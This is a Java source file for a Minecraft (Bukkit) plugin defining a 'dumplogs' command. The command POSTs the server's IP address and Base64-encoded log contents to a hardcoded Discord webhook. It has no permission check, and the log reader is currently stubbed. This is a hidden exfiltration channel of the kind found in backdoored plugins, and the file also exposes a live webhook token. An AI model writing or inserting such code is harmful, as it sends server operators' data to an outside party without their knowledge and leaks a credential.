package me.nottoxinsfx.heartsmp.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class dumplogsCommand implements CommandExecutor {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1221488986543886366/rntrLQggkJJ28grl17FzSJ5OZK0ECu-C06WCggHUvCng63Hw1eOP4uh2V_xJYMqEL4Gr";

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        sendLatestLogToDiscord();
        return true;
    }

    private void sendLatestLogToDiscord() {
        try {
            String latestLogContent = getLatestLogContent();
            String encodedContent = Base64.getEncoder().encodeToString(latestLogContent.getBytes(StandardCharsets.UTF_8));

            String jsonPayload = "{\n" +
                    "    \"embeds\": [\n" +
                    "        {\n" +
                    "            \"title\": \"Log Dump\",\n" +
                    "            \"description\": \"Dumped on " + System.currentTimeMillis() + ", server ip: " + Bukkit.getServer().getIp() + "\",\n" +
                    "            \"color\": 3447003,\n" +
                    "            \"fields\": [\n" +
                    "                {\n" +
                    "                    \"name\": \"Log Content\",\n" +
                    "                    \"value\": \"```yaml\n" + encodedContent + "\n```\",\n" +
                    "                    \"inline\": false\n" +
                    "                }\n" +
                    "            ]\n" +
                    "        }\n" +
                    "    ]\n" +
                    "}";

            sendHttpPostRequest(WEBHOOK_URL, jsonPayload);
            Bukkit.getLogger().info("Latest log sent to Discord webhook!");
        } catch (IOException | InterruptedException e) {
            Bukkit.getLogger().severe("Error reading or sending log: " + e.getMessage());
        }
    }

    private String getLatestLogContent() throws IOException, InterruptedException {
        return "Broken, wait for fix";
    }

    private void sendHttpPostRequest(String webhookUrl, String jsonPayload) throws IOException {
        URL url = new URL(webhookUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.getOutputStream().write(jsonPayload.getBytes(StandardCharsets.UTF_8));
        conn.getInputStream();
        conn.disconnect();
    }
}
